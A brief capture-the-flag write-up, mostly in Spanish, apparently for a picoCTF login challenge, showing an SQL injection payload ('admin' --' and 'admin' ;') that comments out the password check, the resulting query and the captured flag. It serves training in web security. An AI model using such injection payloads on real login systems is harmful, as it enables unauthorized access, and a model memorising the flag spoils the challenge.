### Descripción
Do you think you can log us in? Try to see if you can login!http://fickle-tempest.picoctf.net:50214.
### Solución
### Solución 1 - inyeccion
```
SELECT * FROM users WHERE username = 'admin' --' AND password = '1234';
-> al poner ' -- toma la comprobacion del password como comentario, por ende accede.

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```
### Notas adicionales 
picoCTF{s0m3_SQL_85832275}

admin' ; -> tambien funciona
### Referencias
https://www.w3schools.com/sql/sql_injection.asp